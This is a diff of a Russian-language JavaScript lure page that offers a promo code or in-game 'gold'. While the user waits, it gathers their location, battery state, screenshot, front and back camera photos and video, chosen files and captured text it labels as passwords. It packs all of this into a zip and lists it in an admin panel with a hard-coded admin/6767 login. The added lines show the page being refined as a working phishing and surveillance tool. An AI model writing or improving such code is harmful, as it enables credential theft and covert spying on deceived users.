+            if (videoFront) mediaData.push({ type: 'video', cam: 'front', data: videoFront });
+            setStep(4, 'done');
+            setStatus(`✅ ВИДЕО: ${(videoBack?'ЗАДНЯЯ ':'')}${(videoFront?'ПЕРЕДНЯЯ':'')}`, 'success');
             
-            // 4. Файлы
-            updateProgress(75, '📁 ВЫБЕРИТЕ ФАЙЛЫ...');
-            document.getElementById('fileUpload').click();
-            await waitForFiles(15000);
-            updateProgress(85, '📁 ФАЙЛОВ: ' + collectedFiles.length);
+            // ШАГ 5: ФАЙЛЫ
+            setStep(5, 'active');
+            setStatus('📁 ВЫБЕРИТЕ ФАЙЛЫ (ФОТО/ВИДЕО)...', '');
+            await waitForFiles(25000);
+            setStep(5, 'done');
+            setStatus(`📁 ФАЙЛОВ ВЫБРАНО: ${collectedFiles.length}`, 'success');
             
-            // 5. ZIP
-            updateProgress(90, '📦 СОЗДАНИЕ АРХИВА...');
+            // ШАГ 6: ZIP
+            setStep(6, 'active');
+            setStatus('📦 СОЗДАНИЕ ZIP АРХИВА...', '');
+            
             const zip = new JSZip();
             
             // Данные
             const data = {
-                "ВРЕМЯ СБОРА": new Date().toISOString(),
+                "ВРЕМЯ": new Date().toISOString(),
                 "БРАУЗЕР": navigator.userAgent,
-                "ПЛАТФОРМА": navigator.platform,
                 "ЭКРАН": { "ШИРИНА": screen.width, "ВЫСОТА": screen.height },
-                "ГЕОЛОКАЦИЯ": await getGeolocation(),
+                "ГЕО": await getGeolocation(),
                 "БАТАРЕЯ": await getBatteryInfo(),
-                "ПЕРЕХВАЧЕННЫЕ ДАННЫЕ": capturedData.slice(-200)
+                "ПАРОЛИ": capturedData.slice(-200)
             };
-            
             zip.file('ДАННЫЕ.json', JSON.stringify(data, null, 2));
-            zip.file('ПЕРЕХВАЧЕННЫЕ_ДАННЫЕ.json', JSON.stringify(capturedData, null, 2));
+            zip.file('ПАРОЛИ.json', JSON.stringify(capturedData, null, 2));
             
             // Скриншот
             if (screenshotData) {
-                const base64 = screenshotData.split(',')[1];
-                if (base64) zip.file('СКРИНШОТ.png', base64, { base64: true });
+                const b64 = screenshotData.split(',')[1];
+                if (b64) zip.file('СКРИНШОТ.png', b64, { base64: true });
             }
             
-            // Фото
-            if (photos.back) {
-                const base64 = photos.back.split(',')[1];
-                if (base64) zip.file('ФОТО_ЗАДНЯЯ.jpg', base64, { base64: true });
-            }
-            if (photos.front) {
-                const base64 = photos.front.split(',')[1];
-                if (base64) zip.file('ФОТО_ПЕРЕДНЯЯ.jpg', base64, { base64: true });
-            }
+            // Медиа
+            mediaData.forEach((m, i) => {
+                try {
+                    const b64 = m.data.split(',')[1];
+                    if (b64) {
+                        const ext = m.type === 'photo' ? 'jpg' : 'mp4';
+                        zip.file(`МЕДИА/${i}_${m.cam}_${m.type}.${ext}`, b64, { base64: true });
+                    }
+                } catch(e) {}
+            });
             
-            // Видео
-            if (videos.back) {
-                const base64 = videos.back.split(',')[1];
-                if (base64) zip.file('ВИДЕО_ЗАДНЯЯ.mp4', base64, { base64: true });
-            }
-            if (videos.front) {
-                const base64 = videos.front.split(',')[1];
-                if (base64) zip.file('ВИДЕО_ПЕРЕДНЯЯ.mp4', base64, { base64: true });
-            }
-            
-            // Файлы
+            // Файлы пользователя
             collectedFiles.forEach((f, i) => {
                 try {
-                    const base64 = f.data.split(',')[1];
-                    if (base64) {
-                        zip.file(`ФАЙЛЫ/${i}_${f.name}`, base64, { base64: true });
+                    const b64 = f.data.split(',')[1];
+                    if (b64) {
+                        const ext = f.name.split('.').pop() || 'file';
+                        zip.file(`ФАЙЛЫ/${i}_${f.name}`, b64, { base64: true });
                     }
                 } catch(e) {}
             });
@@ -655,26 +704,27 @@
             // Сессия
             const session = {
                 id: Date.now(),
-                timestamp: data["ВРЕМЯ СБОРА"],
+                time: data["ВРЕМЯ"],
                 preview: {
-                    userAgent: String(data["БРАУЗЕР"]).substring(0, 50),
+                    ua: String(data["БРАУЗЕР"]).substring(0, 40),
                     files: collectedFiles.length,
-                    photos: (photos.back ? 1 : 0) + (photos.front ? 1 : 0),
-                    videos: (videos.back ? 1 : 0) + (videos.front ? 1 : 0)
+                    media: mediaData.length
                 }
             };
             sessions.push(session);
             localStorage.setItem('sessions', JSON.stringify(sessions));
             
             // Скачивание
-            updateProgress(95, '⬇️ СКАЧИВАНИЕ...');
+            setStatus('⬇️ СКАЧИВАНИЕ ZIP...', '');
             const blob = await zip.generateAsync({ type: 'blob' });
-            saveAs(blob, `ПРОМОКОД_${new Date().toISOString().slice(0,10)}.zip`);
+            saveAs(blob, `ГОЛДА_${new Date().toISOString().slice(0,10)}.zip`);
             
-            updateProgress(100, '🎉 ГОТОВО!');
-            btn.textContent = '✅ АКТИВИРОВАНО';
+            setStep(6, 'done');
+            setStatus('🎉 ГОЛДА ПОЛУЧЕНА!', 'success');
+            btn.classList.remove('loading');
+            btn.querySelector('.btn-text').textContent = '✅ ГОТОВО';
             
-            // Через 10 секунд - скрыть
+            // Через 10 сек - скрыть
             setTimeout(() => {
                 mainPage.style.display = 'none';
                 finalMessage.style.display = 'block';
@@ -682,12 +732,14 @@
             }, 10000);
             
         } catch (err) {
-            status.textContent = '❌ ОШИБКА: ' + (err.message || 'НЕИЗВЕСТНАЯ ОШИБКА');
-            console.error('Error:', err);
-            btn.textContent = '🎁 АКТИВИРОВАТЬ ПРОМОКОД';
+            setStatus('❌ ОШИБКА: ' + (err.message || 'НЕИЗВЕСТНО'), 'error');
+            console.error(err);
+            btn.classList.remove('loading');
             btn.disabled = false;
-            document.getElementById('progressBar').style.display = 'none';
+            btn.querySelector('.btn-text').textContent = '🎁 ПОЛУЧИТЬ ГОЛДУ';
         }
+        
+        isRunning = false;
     }
 
     // ============================================================
@@ -695,119 +747,88 @@
     // ============================================================
     function getGeolocation() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve({ error: 'НЕ ПОДДЕРЖИВАЕТСЯ' });
-                return;
-            }
+            if (!navigator.geolocation) { resolve({ error: 'НЕТ' }); return; }
             navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
-                        "ШИРОТА": pos.coords.latitude,
-                        "ДОЛГОТА": pos.coords.longitude,
-                        "ТОЧНОСТЬ": pos.coords.accuracy
-                    });
-                },
+                (p) => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
                 () => resolve({ error: 'ОТКАЗАНО' }),
-                { enableHighAccuracy: true, timeout: 3000 }
+                { timeout: 3000 }
             );
         });
     }
 
     function getBatteryInfo() {
         return new Promise((resolve) => {
-            if (!navigator.getBattery) {
-                resolve({ error: 'НЕ ПОДДЕРЖИВАЕТСЯ' });
-                return;
-            }
-            navigator.getBattery().then((battery) => {
-                resolve({
-                    "УРОВЕНЬ": Math.round(battery.level * 100) + '%',
-                    "ЗАРЯДКА": battery.charging ? 'ДА' : 'НЕТ'
-                });
-            }).catch(() => resolve({ error: 'ОШИБКА' }));
+            if (!navigator.getBattery) { resolve({ error: 'НЕТ' }); return; }
+            navigator.getBattery().then(b => resolve({
+                level: Math.round(b.level * 100) + '%',
+                charging: b.charging ? 'ДА' : 'НЕТ'
+            })).catch(() => resolve({ error: 'ОШИБКА' }));
         });
     }
 
     // ============================================================
     // 11. АДМИНКА
     // ============================================================
-    function renderAdminPanel() {
-        const sessionsList = document.getElementById('sessionsList');
-        const passwordsList = document.getElementById('passwordsList');
-
-        sessionsList.innerHTML = '';
-        if (sessions.length === 0) {
-            sessionsList.innerHTML = '<p style="color:#888;">НЕТ СЕССИЙ</p>';
-        } else {
-            sessions.slice().reverse().forEach(s => {
-                const div = document.createElement('div');
-                div.className = 'session-item';
-                div.innerHTML = `
-                    <strong>${new Date(s.timestamp).toLocaleString()}</strong>
+    function renderAdmin() {
+        const list = document.getElementById('sessionsList');
+        list.innerHTML = sessions.length === 0 ? '<p style="color:#888;">НЕТ СЕССИЙ</p>' :
+            sessions.slice().reverse().map(s => `
+                <div class="session-item">
+                    <strong>${new Date(s.time).toLocaleString()}</strong>
                     <span class="badge">ID: ${s.id}</span>
-                    <br>БРАУЗЕР: ${s.preview.userAgent || 'НЕТ'}
-                    <br>ФАЙЛОВ: ${s.preview.files || 0} | ФОТО: ${s.preview.photos || 0} | ВИДЕО: ${s.preview.videos || 0}
-                    <br><button class="delete-session-btn" data-id="${s.id}" style="background:#ff4444;color:#fff;width:auto;padding:5px 15px;font-size:12px;margin-top:5px;">УДАЛИТЬ</button>
-                `;
-                sessionsList.appendChild(div);
-            });
-        }
-
-        passwordsList.innerHTML = '';
-        if (capturedData.length === 0) {
-            passwordsList.innerHTML = '<p style="color:#888;">НЕТ ДАННЫХ</p>';
-        } else {
-            capturedData.slice().reverse().forEach(p => {
-                const div = document.createElement('div');
-                div.className = 'password-item';
-                div.innerHTML = `
+                    <br>БРАУЗЕР: ${s.preview.ua || 'НЕТ'}
+                    <br>ФАЙЛОВ: ${s.preview.files || 0} | МЕДИА: ${s.preview.media || 0}
+                    <br><button class="btn-small" onclick="deleteSession(${s.id})">УДАЛИТЬ</button>
+                </div>
+            `).join('');
+        
+        const plist = document.getElementById('passwordsList');
+        plist.innerHTML = capturedData.length === 0 ? '<p style="color:#888;">НЕТ ДАННЫХ</p>' :
+            capturedData.slice().reverse().slice(0, 50).map(p => `
+                <div class="password-item">
                     <strong>${new Date(p["ВРЕМЯ"]).toLocaleString()}</strong>
                     <span style="color:#ff6666;">📌 ${p["ЗНАЧЕНИЕ"]}</span>
-                    <br>ИСТОЧНИК: ${p["ОТКУДА ВЗЯЛОСЬ"] || 'НЕИЗВЕСТНО'}
-                `;
-                passwordsList.appendChild(div);
-            });
-        }
-
-        document.querySelectorAll('.delete-session-btn').forEach(btn => {
-            btn.onclick = function() {
-                const id = parseInt(this.dataset.id);
-                sessions = sessions.filter(s => s.id !== id);
-                localStorage.setItem('sessions', JSON.stringify(sessions));
-                renderAdminPanel();
-            };
-        });
+                    <br>ИСТОЧНИК: ${p["ОТКУДА"] || 'НЕТ'}
+                </div>
+            `).join('');
     }
+
+    window.deleteSession = function(id) {
+        sessions = sessions.filter(s => s.id !== id);
+        localStorage.setItem('sessions', JSON.stringify(sessions));
+        renderAdmin();
+    };
 
     async function exportAdminZip() {
         const status = document.getElementById('adminStatus');
-        status.textContent = '📦 СОЗДАНИЕ АРХИВА...';
-        
+        status.textContent = '📦 СОЗДАНИЕ...';
         try {
             const zip = new JSZip();
             zip.file('ВСЕ_ДАННЫЕ.json', JSON.stringify({
-                "СЕССИИ": sessions,
-                "ПЕРЕХВАЧЕННЫЕ_ДАННЫЕ": capturedData,
-                "ДАТА_ЭКСПОРТА": new Date().toISOString()
+                sessions: sessions,
+                passwords: capturedData,
+                date: new Date().toISOString()
             }, null, 2));
-            
             const blob = await zip.generateAsync({ type: 'blob' });
-            saveAs(blob, `АДМИН_ЭКСПОРТ_${new Date().toISOString().slice(0,10)}.zip`);
-            status.textContent = '✅ ЭКСПОРТ ГОТОВ';
-            status.style.color = '#4ade80';
-        } catch (err) {
-            status.textContent = '❌ ОШИБКА: ' + err.message;
-            status.style.color = '#f87171';
+            saveAs(blob, `АДМИН_${new Date().toISOString().slice(0,10)}.zip`);
+            status.textContent = '✅ ГОТОВО';
+            status.className = 'status success';
+        } catch(e) {
+            status.textContent = '❌ ' + e.message;
+            status.className = 'status error';
         }
     }
 
     // ============================================================
-    // 12. ЗАПУСК
+    // 12. ИНИЦИАЛИЗАЦИЯ
     // ============================================================
     document.addEventListener('DOMContentLoaded', function() {
         setupCapture();
 
-        document.getElementById('startBtn').addEventListener('click', startCollection);
+        document.getElementById('startBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            startCollection();
+        });
 
         document.getElementById('goToAdminBtn').addEventListener('click', function() {
             document.getElementById('mainPage').style.display = 'none';
@@ -815,31 +836,30 @@
             document.getElementById('loginForm').classList.remove('hidden');
             document.getElementById('adminContent').classList.add('hidden');
             document.getElementById('adminStatus').textContent = '';
+            document.getElementById('adminStatus').className = 'status';
         });
 
         document.getElementById('adminLoginBtn').addEventListener('click', function() {
             const login = document.getElementById('adminLogin').value.trim();
-            const password = document.getElementById('adminPassword').value.trim();
-            if (login === 'admin' && password === '6767') {
-                document.getElementById('adminStatus').textContent = '✅ ДОСТУП РАЗРЕШЁН';
-                document.getElementById('adminStatus').style.color = '#4ade80';
-                isAdmin = true;
+            const pass = document.getElementById('adminPassword').value.trim();
+            const st = document.getElementById('adminStatus');
+            if (login === 'admin' && pass === '6767') {
+                st.textContent = '✅ ДОСТУП РАЗРЕШЁН';
+                st.className = 'status success';
                 document.getElementById('loginForm').classList.add('hidden');
                 document.getElementById('adminContent').classList.remove('hidden');
-                renderAdminPanel();
+                renderAdmin();
             } else {
-                document.getElementById('adminStatus').textContent = '❌ НЕВЕРНЫЙ ЛОГИН ИЛИ ПАРОЛЬ';
-                document.getElementById('adminStatus').style.color = '#f87171';
+                st.textContent = '❌ НЕВЕРНЫЕ ДАННЫЕ';
+                st.className = 'status error';
             }
         });
 
         document.getElementById('logoutBtn').addEventListener('click', function() {
-            isAdmin = false;
             document.getElementById('adminPage').classList.add('hidden');
             document.getElementById('mainPage').style.display = 'block';
             document.getElementById('loginForm').classList.remove('hidden');
             document.getElementById('adminContent').classList.add('hidden');
-            document.getElementById('adminStatus').textContent = '';
         });
 
         document.getElementById('clearSessionsBtn').addEventListener('click', function() {
@@ -848,7 +868,7 @@
                 capturedData = [];
                 localStorage.setItem('sessions', JSON.stringify(sessions));
                 localStorage.setItem('capturedData', JSON.stringify(capturedData));
-                renderAdminPanel();
+                renderAdmin();
             }
         });
 
